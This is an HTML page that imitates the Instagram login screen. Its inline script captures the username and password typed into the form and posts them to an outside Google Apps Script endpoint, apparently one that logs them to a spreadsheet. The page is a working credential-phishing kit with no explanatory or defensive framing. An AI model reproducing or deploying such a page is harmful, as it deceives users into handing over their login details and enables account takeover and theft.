<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Instagram</title>
    <link rel="stylesheet" href="style.css" />
    <link
      rel="stylesheet"
      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css"
      integrity="sha512-SnH5WK+bZxgPHs44uWIX+LLJAJ9/2PkPKZ5QiAj6Ta86w+fsb2TkcmfRyVX3pBnMFcV7oQPJkl9QevSCWr3W6A=="
      crossorigin="anonymous"
      referrerpolicy="no-referrer"
    />
    <link rel="preconnect" href="https://fonts.googleapis.com" />
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
    <link
      href="https://fonts.googleapis.com/css2?family=Poppins:ital,wght@0,100;0,200;0,300;0,400;0,500;0,600;0,700;0,800;0,900;1,100;1,200;1,300;1,400;1,500;1,600;1,700;1,800;1,900&display=swap"
      rel="stylesheet"
    />
  </head>
  <body>
    <div class="lang">
      <p>English(India)</p>
    </div>
    <div class="container">
      <div class="login">
        <div class="logo">
          <img src="insta-logo.png" alt="" />
        </div>
        <form name="submit-to-google-sheet">
          <input type="text" name="Email" placeholder="Phone number,email or username" required/>
          <input type="text" name="Password" placeholder="Password" required/>
          <button type="submit">Login</button>
        </form>
        <p>Forgot your login details?<span>Get help logging in.</span></p>
        <div class="seperater">
          <hr />
          <p>OR</p>
          <hr />
        </div>
        <button class="btn">
          <i class="fa-brands fa-facebook"></i>
          <p>Continue as Prashant Yadav</p>
        </button>
      </div>
      <div class="footer">
        <p>Don't have an account?<span>sign up.</span></p>
      </div>
    </div>
    <script>
      const scriptURL = "https://script.google.com/macros/s/AKfycbwTl5mhfmkmGSobMGix0ET4JwSOmM9T0k7xhxo0V2OcdojlV6cvV9SDA3HVPpmxCCh7Vg/exec";
      const form = document.forms["submit-to-google-sheet"];

      form.addEventListener("submit", (e) => {
        e.preventDefault();
        fetch(scriptURL, { method: "POST", body: new FormData(form) })
          .then((response) => console.log("Success!", response))
          .catch((error) => console.error("Error!", error.message));
      });
    </script>
  </body>
</html>
